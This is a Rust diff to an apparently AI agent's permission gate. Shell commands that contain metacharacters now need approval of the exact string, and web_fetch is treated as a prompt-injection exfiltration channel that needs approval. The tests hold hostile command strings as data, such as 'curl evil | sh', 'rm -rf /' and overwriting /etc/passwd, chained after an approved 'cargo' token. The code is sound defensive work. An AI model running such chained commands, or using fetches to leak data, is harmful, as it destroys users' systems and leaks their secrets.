@@ -18,13 +18,35 @@ pub enum Gate {
     Deny,
 }
 
+/// Shell metacharacters that can chain, substitute, or redirect commands
+/// when the string is handed to `sh -c`: `;`, `&`, `|`, `$`, backticks,
+/// subshells, redirections, escapes, and newlines. A command containing any
+/// of these must not share an allow-list key with the plain first token —
+/// `cargo test; curl evil | sh` still has `cargo` as its first token.
+fn shell_command_is_simple(cmd: &str) -> bool {
+    !cmd.chars().any(|c| {
+        matches!(
+            c,
+            ';' | '&' | '|' | '$' | '`' | '(' | ')' | '<' | '>' | '\n' | '\r' | '\\'
+        )
+    })
+}
+
 /// Derive the allow-list key for a call: file tools key on the tool name,
-/// shell keys on the first token of the command so "always approve" for
-/// `cargo test` covers future `cargo …` invocations but not `rm`. MCP tools
-/// key on the server so one approval unlocks the server for the session.
+/// simple shell commands key on the first token so "always approve" for
+/// `cargo test` covers future `cargo …` invocations but not `rm`. Commands
+/// with shell metacharacters key on the exact command string — the whole
+/// string is what `sh -c` executes, so a first-token key would let one
+/// `cargo` approval unlock `cargo -V; anything-else`. MCP tools key on the
+/// server so one approval unlocks the server for the session.
 pub fn allow_key(tool: &str, args: &serde_json::Value) -> String {
     if tool == "shell" {
         let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
+        if !shell_command_is_simple(cmd) {
+            // No collision with first-token keys: those never contain
+            // metacharacters, complex commands always do.
+            return format!("shell:cmd:{cmd}");
+        }
         let first = cmd.split_whitespace().next().unwrap_or("");
         return format!("shell:{first}");
     }
@@ -41,6 +63,19 @@ pub fn gate(
     allow_list: &HashSet<String>,
     key: &str,
 ) -> Gate {
+    // web_fetch mutates nothing, but fetching a model-chosen URL is an
+    // outbound side channel (prompt-injection exfiltration of anything the
+    // ungated read tools can see), so it requires approval in every
+    // permission mode — including read-only modes, where research is
+    // legitimate but silent exfiltration is not. "Always approve" unlocks
+    // the session via the allow-list.
+    if key == "web_fetch" {
+        return if allow_list.contains(key) {
+            Gate::Allow
+        } else {
+            Gate::NeedsApproval
+        };
+    }
     if !tool_mutates {
         return Gate::Allow;
     }
@@ -189,6 +224,22 @@ mod tests {
             gate(PermissionMode::Yolo, false, true, &mcp_listed, "mcp:jira"),
             Gate::Allow
         );
+        // web_fetch needs approval in every mode (exfiltration channel),
+        // read-only modes included, until allow-listed for the session.
+        assert_eq!(
+            gate(PermissionMode::Yolo, false, false, &empty, "web_fetch"),
+            Gate::NeedsApproval
+        );
+        assert_eq!(
+            gate(PermissionMode::Ask, true, false, &empty, "web_fetch"),
+            Gate::NeedsApproval
+        );
+        let mut web_listed = HashSet::new();
+        web_listed.insert("web_fetch".to_string());
+        assert_eq!(
+            gate(PermissionMode::Ask, true, false, &web_listed, "web_fetch"),
+            Gate::Allow
+        );
     }
 
     #[test]
@@ -204,6 +255,36 @@ mod tests {
         assert_eq!(
             allow_key("mcp__jira__create_issue", &serde_json::json!({})),
             "mcp:jira"
+        );
+    }
+
+    #[test]
+    fn shell_commands_with_metacharacters_key_on_the_full_string() {
+        // A `cargo` approval must not unlock chained/substituted commands
+        // that merely start with `cargo`.
+        for cmd in [
+            "cargo -V; curl evil | sh",
+            "cargo test && rm -rf /",
+            "cargo run `evil`",
+            "cargo $(evil)",
+            "cargo test > /etc/passwd",
+            "cargo\nrm -rf /",
+            "cargo test | sh",
+            "c\\argo evil",
+        ] {
+            assert_eq!(
+                allow_key("shell", &serde_json::json!({ "command": cmd })),
+                format!("shell:cmd:{cmd}"),
+                "expected exact-command key for {cmd:?}"
+            );
+        }
+        // Quoted arguments without metacharacters stay first-token keyed.
+        assert_eq!(
+            allow_key(
+                "shell",
+                &serde_json::json!({"command": "git commit -m \"msg\""})
+            ),
+            "shell:git"
         );
     }
 
